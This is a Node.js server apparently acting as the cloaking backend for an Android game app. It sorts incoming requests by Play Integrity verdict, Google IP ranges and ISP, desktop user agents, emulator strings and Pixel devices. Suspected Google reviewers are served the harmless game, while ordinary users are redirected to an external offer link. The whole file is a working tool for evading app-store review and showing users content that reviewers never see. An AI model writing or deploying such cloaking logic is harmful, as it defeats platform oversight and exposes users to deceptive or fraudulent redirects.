const express = require('express')
const axios = require('axios')
const ipRangeCheck = require('ip-range-check')
const { GoogleAuth } = require('google-auth-library')

const app = express()
app.use(express.json())

// =========================
// 🔐 GOOGLE AUTH
// =========================
const auth = new GoogleAuth({
    keyFile: './keys/integrity.json',
    scopes: ['https://www.googleapis.com/auth/playintegrity']
})

// =========================
// 🔥 GOOGLE IP
// =========================
const GOOGLE_IP_RANGES = [
    "34.0.0.0/8",
    "35.0.0.0/8",
    "66.249.64.0/19",
    "64.233.160.0/19",
    "8.8.8.0/24"
]

// =========================
// 🔥 BAD DEVICES
// =========================
const BAD_DEVICES = [
    "sdk",
    "emulator",
    "generic",
    "x86",
    "test-keys",
    "genymotion"
]

// =========================
// 🔐 VERIFY INTEGRITY
// =========================
async function verifyIntegrity(token) {
    try {
        const client = await auth.getClient()

        const response = await client.request({
            url: `https://playintegrity.googleapis.com/v1/com.casual.memory.prismtwins:decodeIntegrityToken`,
            method: 'POST',
            data: {
                integrity_token: token
            }
        })

        const payload = response.data.tokenPayloadExternal

        const device = payload.deviceIntegrity || []
        const app = payload.appIntegrity || {}

        const valid =
            device.includes("MEETS_DEVICE_INTEGRITY") &&
            app.appRecognitionVerdict === "PLAY_RECOGNIZED"

        return valid

    } catch (e) {
        console.log("Integrity error:", e.message)
        return false
    }
}

// =========================
// 🔥 MAIN FLOW
// =========================
app.post('/flow', async (req, res) => {

    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ""
    const ip = rawIp.split(',')[0].trim()

    const {
        device = "",
        userAgent = "",
        integrityToken = ""
    } = req.body

    let isp = ""

    // =========================
    // 🌐 IP INFO
    // =========================
    try {
        const ipData = await axios.get(`https://ipapi.co/${ip}/json/`, {
            timeout: 2000
        })
        isp = ipData.data.org || ""
    } catch (e) {
        console.log("IP API error:", e.message)
    }

    // =========================
    // 🔐 INTEGRITY CHECK
    // =========================
    let integrityValid = false

    if (integrityToken) {
        integrityValid = await verifyIntegrity(integrityToken)
    }

    // =========================
    // 🧠 RISK SYSTEM
    // =========================
    let risk = 0

    if (!integrityValid) {
        risk += 80
        console.log("⚠️ Bad Integrity")
    }

    if (ipRangeCheck(ip, GOOGLE_IP_RANGES)) {
        risk += 70
        console.log("⚠️ Google IP:", ip)
    }

    if (isp.includes("Google")) {
        risk += 50
        console.log("⚠️ Google ISP:", isp)
    }

    if (
        userAgent.includes("Windows") ||
        userAgent.includes("Mac") ||
        userAgent.includes("X11")
    ) {
        risk += 40
        console.log("⚠️ Desktop:", userAgent)
    }

    const lowerDevice = device.toLowerCase()

    if (BAD_DEVICES.some(d => lowerDevice.includes(d))) {
        risk += 80
        console.log("⚠️ Emulator:", device)
    }

    if (
        device.includes("Pixel") ||
        device.includes("Nexus")
    ) {
        risk += 20
    }

    // =========================
    // 🚫 BLOCK
    // =========================
    if (risk >= 60) {
        console.log("❌ GAME:", ip, "risk:", risk)
        return res.json({ action: "WHITE" })
    }

    // =========================
    // ✅ OFFER
    // =========================
    console.log("✅ OFFER:", ip, "risk:", risk)

    return res.json({
        action: "OFFER",
        url: "https://trikstrip.fun/9YMjTwDG?sub_id_1=com.casual.memory.prismtwins"
    })
})

// =========================
// 🚀 START
// =========================
const PORT = process.env.PORT || 3000

app.listen(PORT, () => {
    console.log("🚀 Server started on port", PORT)
})
